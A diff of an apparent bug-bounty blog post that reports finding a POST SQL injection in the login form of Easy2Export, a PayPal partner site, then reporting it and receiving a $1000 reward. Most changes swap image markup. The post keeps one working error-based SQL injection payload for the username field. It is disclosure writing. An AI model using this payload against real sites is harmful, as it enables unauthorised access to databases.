@@ -9,9 +9,10 @@ It’s been a year after my website ‘jeroldcamacho.com’ was gone because I f
 
 **Easy2Export** is one of paypal partner website, yeah it is! [[..]](http://www.ecommercebytes.com/cab/abn/y13/m12/i24/s04)
 
-<center>
-<img src="https://jmrncz.files.wordpress.com/2016/05/yeah-m.jpg">
-</center>
+<p align="center">
+<img src="/assets/images/yeah-m.jpg">
+</p>
+
 <br>
 At first, i tried to break the login form. After a few minutes of testing, I foundout that the login form is vulnerable to POST SQL Injection.
 
@@ -24,22 +25,23 @@ Host: easy2export.com
 LoginForm[username]=’ or 1 group by concat_ws(0x3a,user(),floor(rand(0)*2)) having min(0) or 1–+&LoginForm[password]=’&LoginForm[accounttype]=sub&LoginForm[rememberMe]=0&yt0=
 ```
 <br>
-<center>
-<img src="https://jmrncz.files.wordpress.com/2016/05/easy2export-sql-injection1.png">
-</center>
+<p align="center">
+<img src="/assets/images/easy2export-sql-injection1.png">
+</p>
 <br>
 I immediately reported this to PayPal and they fixed the vulnerability issue quickly. **[10/30/2014 09:21:53]**
 <br>
-<center>
-<img src="https://jmrncz.files.wordpress.com/2016/05/inhale-m.jpg">
-</center>
+<p align="center">
+<img src="/assets/images/inhale-m.jpg">
+</p>
 <br>
 In their bug bounty program guidelines, it is noted that sql injection in paypal partner sites will receive 1000$.
 .
 .
 And they checked the eligibility of my report so they then send me the reward amounting to 1000$. **[11/22/14 6:23:35]**
-
-<img src="https://jmrncz.files.wordpress.com/2016/05/paypal-bounty.png">
+<p align="center">
+<img src="/assets/images/paypal-bounty.png">
+</p>
 
 Thanks for reading! stay tuned for more blog posts.
 
